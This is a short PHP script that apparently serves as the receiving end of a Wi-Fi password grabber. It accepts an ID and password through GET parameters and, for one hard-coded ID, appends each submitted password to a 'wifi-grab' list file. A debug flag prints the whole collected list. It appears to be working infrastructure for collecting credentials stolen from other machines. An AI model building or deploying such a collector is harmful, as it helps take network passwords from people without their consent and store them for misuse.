<?php
if (isset($_GET["id"]) && isset($_GET["pw"])) {
    $id = htmlspecialchars($_GET["id"]);
    $pw = htmlspecialchars($_GET["pw"]);
    $pw = str_replace("0spatie0", " ", $pw);
    if ($pw == "") {
        die("error: pw empty");
    }
    echo "<p>id:$id</p>
          <p>pw:$pw</p>";
    if ($id == "0491") {
        $arr = [];
        $data = fopen("../wifi-grab/list.txt", 'r');
        while (!feof($data)) {
            array_push($arr, fgets($data));
        }
        fclose($data);
        array_push($arr, $pw);
        $arr = implode("[({^})]", $arr);
        if (isset($_GET["debug"])) {
            $debug = htmlspecialchars($_GET["debug"]);
            if ($debug == "true") {
                echo "<p>$arr</p>";
            }
        }
        $bestand = fopen("../wifi-grab/list.txt", 'w');
        fwrite($bestand, $arr);
        fclose($bestand);
    }
}
?>